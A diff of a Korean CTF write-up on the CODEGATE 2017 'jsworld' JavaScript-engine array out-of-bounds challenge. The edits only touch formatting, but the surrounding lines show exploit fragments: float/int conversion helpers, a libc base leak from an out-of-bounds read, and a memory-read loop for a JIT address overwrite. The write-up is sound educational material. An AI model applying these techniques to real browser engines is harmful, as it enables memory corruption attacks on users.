@@ -25,11 +25,11 @@ tags: javascript_engine, javascript, browser, pwn, compiler
 
 롸업은
 
-
+```
 https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/
 https://pwn3r.tistory.com/entry/CODEGATE-2017-QUAL-jsworld
 https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/2017_codegate_js_world/
-
+```
 
 을 참고했다. 특히 첫 번째 블로그에서 출제자 입장에서의 문제풀이를 보니까 일반적인 롸업이랑은 조금 다른 느낌을 받았다. 문제를 낸 이유와 과정들이 담겨있다보니 색달랐다. 아무튼 그랬다. ㅎㅎ;
 
@@ -39,6 +39,7 @@ https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/2017_codegate_js_world/
 
 Original jsarray.cpp
 ```c++
+
 JSBool
 js::array_pop(JSContext *cx, unsigned argc, Value *vp)
 {
@@ -276,6 +277,7 @@ readline()
 ### jit_address overwrite
 
 ```javascript
+
 function itod(data){
     var buffer = new ArrayBuffer(8);
     var f = new Float64Array(buffer);
@@ -363,7 +365,7 @@ for(var i=0; i<0x40; i++)
 
 libc_mmap_base = dtoi(a[100003]) - 0x106510 -0x40-0x3240-0x1e00
 print('libc_mmap_base : ' + hex(libc_mmap_base))
-print('a2_array\'s pointer : ' + hex(libc_mmap_base + 0x4b638))
+print("a2_array's pointer :" + hex(libc_mmap_base + 0x4b638))
 
 for (var i = libc_mmap_base+0x4e000; i<0x4f000+libc_mmap_base; i+=8 ){
 	read_value = read(i)
